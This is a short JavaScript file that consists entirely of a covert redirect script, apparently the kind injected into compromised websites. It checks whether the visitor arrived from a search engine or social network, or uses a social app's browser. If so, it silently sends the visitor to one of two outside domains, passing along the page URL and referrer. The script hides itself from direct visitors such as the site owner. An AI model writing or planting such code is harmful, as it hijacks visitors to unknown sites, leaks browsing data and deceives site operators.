var ars = rChoice([
'https://garden.ecz.pw/',
'https://decor.ecz.pw/'
]);
function rChoice(arr) {
return arr[Math.floor(arr.length * Math.random())];
}

if(['.google.', 'bing.', '.yahoo.', 'yandex.', '.aol.', 'facebook.', 'duckduckgo.', 'youtube.', 'linkedin.', 'instagram.', 'twitter.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
